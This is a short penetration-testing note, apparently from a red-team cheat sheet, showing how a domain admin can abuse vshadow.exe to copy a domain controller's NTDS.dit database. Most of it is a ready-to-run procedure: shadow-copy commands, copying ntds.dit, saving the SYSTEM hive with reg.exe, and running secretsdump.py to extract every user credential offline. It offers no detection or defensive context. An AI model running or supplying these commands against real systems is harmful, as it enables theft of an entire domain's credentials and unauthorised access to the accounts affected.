# Overview
>A [_Shadow Copy_](https://en.wikipedia.org/wiki/Shadow_Copy), also known as _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.
>To manage volume shadow copies, the Microsoft signed binary [_vshadow.exe_](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).
>As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

# Exploit

- Connect as domain admin user to DC, launch elevated cmd.exe and perform a shadow copy of the entire C: drive :
```cmd
vshadow.exe -nw -p  C:
# Take the shadow copy device name
```
- Copying the ntds database to the C: drive
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Extract system
reg.exe save hklm\system c:\system.bak
```

- Extract the credentials with secretsdump :
```bash
secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL
```